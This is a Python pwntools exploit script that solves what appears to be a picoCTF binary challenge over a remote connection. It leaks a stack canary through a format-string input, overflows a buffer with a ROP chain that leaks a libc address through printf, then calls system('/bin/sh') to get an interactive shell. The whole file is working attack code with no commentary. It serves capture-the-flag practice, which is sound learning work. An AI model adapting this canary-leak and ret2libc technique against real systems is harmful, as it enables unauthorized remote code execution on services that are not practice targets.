#!/usr/bin/env python3
from pwn import *

context.terminal = ["alacritty","-e","/bin/sh","-c"]
RECV = 4096

#p = process("./gg2")
#gdb.attach(p)

p = remote("jupiter.challenges.picoctf.org",51473)

p.sendlineafter(b'guess?\n',b'-31')
p.sendlineafter(b'Name? ',b'%135$x')
leak = int(p.recvline().split(b' ')[1][:-1].decode('ascii'),16)

PRINTF_PLT = 0x8048470
LIBC_START_MAIN_GOT = 0x8049fe0
WIN = 0x804876e

ropchain = cyclic(512)
ropchain += p32(leak)
ropchain += cyclic(12)
ropchain += p32(PRINTF_PLT)
ropchain += p32(WIN)
ropchain += p32(LIBC_START_MAIN_GOT)

p.sendlineafter(b'guess?\n',b'-31')
p.sendlineafter(b'Name? ',ropchain)
p.readuntil(b'\n\n')
lsm_leak = u32(p.recv(4))

LIBC_BASE = lsm_leak - 0x018da0
SYSTEM = LIBC_BASE + 0x03cd80
BINSH = LIBC_BASE + 0x17bb8f

ropchain = cyclic(512)
ropchain += p32(leak)
ropchain += cyclic(12)
ropchain += p32(SYSTEM)
ropchain += p32(WIN)
ropchain += p32(BINSH)

p.sendlineafter(b'Name? ',ropchain)

p.interactive()

p.close()
